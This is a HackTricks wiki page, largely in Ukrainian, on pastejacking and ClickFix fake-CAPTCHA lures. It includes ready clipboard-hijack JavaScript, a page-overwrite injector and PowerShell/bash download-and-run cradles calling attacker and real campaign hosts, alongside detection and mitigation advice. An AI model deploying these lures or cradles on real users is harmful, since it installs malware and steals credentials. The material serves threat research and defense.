# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> «Ніколи не вставляйте те, що ви самі не копіювали.» – стара, але досі слушна порада

## Огляд

Clipboard hijacking – також відоме як *pastejacking* – зловживає тим, що користувачі рутинно копіюють і вставляють команди, не перевіряючи їх. Зловмисна веб-сторінка (або будь-який контекст із підтримкою JavaScript, такий як Electron або Desktop application) програмно поміщає контрольований нападачем текст у системний буфер обміну. Жертви зазвичай заохочуються, через ретельно підготовлені інструкції соціальної інженерії, натиснути **Win + R** (діалог "Виконати"), **Win + X** (Швидкий доступ / PowerShell), або відкрити термінал і *вставити* вміст буфера обміну, миттєво виконуючи довільні команди.

Оскільки **жоден файл не завантажується і жодне вкладення не відкривається**, техніка обходить більшість контролів безпеки електронної пошти та веб-контенту, що моніторять вкладення, макроси або пряме виконання команд. Через це атака є популярною в фішингових кампаніях, які доставляють поширені сімейства malware, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **примушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у буфері обміну містить очікувану команду інсталятора плюс доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тож одна вставка виконує обидва етапи, у той час як UI ховає додаткову стадію.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Потік ClickFix / ClearFake

1. Користувач відвідує typosquatted або скомпрометований сайт (e.g. `docusign.sa[.]com`)
2. Інжектований **ClearFake** JavaScript викликає хелпер `unsecuredCopyToClipboard()`, який приховано зберігає Base64-encoded PowerShell one-liner у буфері обміну.
3. HTML-інструкція каже жертві: *“Натисніть **Win + R**, вставте команду та натисніть Enter, щоб вирішити проблему.”*
4. `powershell.exe` виконується, завантажуючи архів, який містить легітимний виконуваний файл та шкідливий DLL (classic DLL sideloading).
5. Завантажувач дешифрує додаткові стадії, інжектить shellcode і встановлює persistence (e.g. scheduled task) – в результаті запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Приклад ланцюжка NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Зловмисна DLL динамічно отримує адреси API через **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх, використовуючи rolling XOR key `"https://google.com/"`, впроваджує фінальний shellcode та розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader в **cscript.exe**
3. Завантажує MSI payload → скидає `libcef.dll` поряд із підписаним додатком → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` та об'єднання файлів і врешті запускає `.a3x`-скрипт, який ексфільтрує облікові дані браузера на `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Деякі кампанії ClickFix повністю пропускають завантаження файлів і просять жертв вставити one‑liner, який завантажує та виконує JavaScript через WSH, забезпечує персистентність і щоденно змінює C2. Приклад спостереженого ланцюжка:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові риси
- Обфускований URL перевертається під час виконання, щоб ускладнити поверхневу перевірку.
- JavaScript забезпечує персистентність через Startup LNK (WScript/CScript) і обирає C2 за поточним днем – що дозволяє швидку domain rotation.

Мінімальний JS-фрагмент, що використовується для rotate C2s за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто прив'язуючи TLS до жорстко вбудованого сертифіката та розбиваючи трафік на частини.

Detection ideas specific to this variant
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript з JS шляхом під `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU та телеметрія командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані `powershell -NoProfile -NonInteractive -Command -` з великими stdin payloads, щоб подавати довгі скрипти без довгих командних рядків.
- Scheduled Tasks, які потім виконують LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під задачею/шляхом, що виглядає як оновлювач (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щоденно-обертаючіся C2 hostnames і URL з шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Корелюйте події запису clipboard, за якими йде вставка через Win+R і негайне виконання `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – шукайте незвичні Base64 / обфусковані записи.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe` і `NewProcessName` в { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілим 4688 подією.
* EDR clipboard sensors (if present) – корелюйте `Clipboard Write`, за яким відразу запускається новий PowerShell процес.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Останні кампанії масово створюють фейкові CDN/browser verification pages ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-specific команди з їхнього clipboard у нативні консолі. Це виводить виконання за межі браузерного sandbox і працює як на Windows, так і на macOS.

Ключові ознаки сторінок, згенерованих цим builder
- Визначення OS через `navigator.userAgent` для підгонки payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціональні decoys/no-ops для непідтримуваних ОС, щоб зберегти ілюзію.
- Автоматичне clipboard-copy при benign UI діях (checkbox/Copy), тоді як видимий текст може відрізнятися від вмісту clipboard.
- Блокування мобільних пристроїв і popover зі покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Опціональна обфускація і single-file injector для перезапису DOM компрометованого сайту Tailwind‑стильованим verification UI (нову реєстрацію домену не вимагає).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Персистентність macOS після початкового запуску
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.

Безпосереднє захоплення сторінки на скомпрометованих сайтах
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Сторінки, які прив'язують Clipboard API до віджетів верифікації; невідповідність між відображеним текстом та payload буфера обміну; `navigator.userAgent` branching; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` незабаром після взаємодії з браузером; batch/MSI інсталятори, виконані з `%TEMP%`.
- macOS endpoint: Terminal/iTerm, що породжує `bash`/`curl`/`base64 -d` з `nohup` поруч із подіями браузера; фонові задачі, які переживають закриття терміналу.
- Корелюйте `RunMRU` Win+R історію та записів буфера обміну з наступним створенням консольних процесів.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометацію WordPress сайтів і ін’єкцію loader JavaScript, який ланцюжить зовнішні хости (Cloudflare Workers, GitHub/jsDelivr) і навіть блокчейн “etherhiding” виклики (e.g., POSTs до Binance Smart Chain API endpoints таких як `bsc-testnet.drpc[.]org`) щоб витягти поточну логіку приманки. Останні оверлеї широко використовують fake CAPTCHAs, які інструктують користувачів copy/paste one-liner (T1204.004) замість завантаження чогось.
- Початкове виконання все частіше делегується підписаним script hosts/LOLBAS. Ланцюги січня 2026 замінили раннє використання `mshta` на вбудований `SyncAppvPublishingServer.vbs`, який виконується через `WScript.exe`, передаючи PowerShell-like аргументи з aliases/wildcards для отримання remote content:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у парі з `WScript.exe` та незвичними аргументами (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) він стає високосигнальною стадією LOLBAS для ClearFake.
- У лютому 2026 fake CAPTCHA payloads повернулися до чистих PowerShell download cradles. Два живі приклади:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Перший chain is an in-memory `iex(irm ...)` grabber; другий стейджиться via `WinHttp.WinHttpRequest.5.1`, writes a temp `.ps1`, then launches with `-ep bypass` in a hidden window.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` or PowerShell cradles immediately after clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
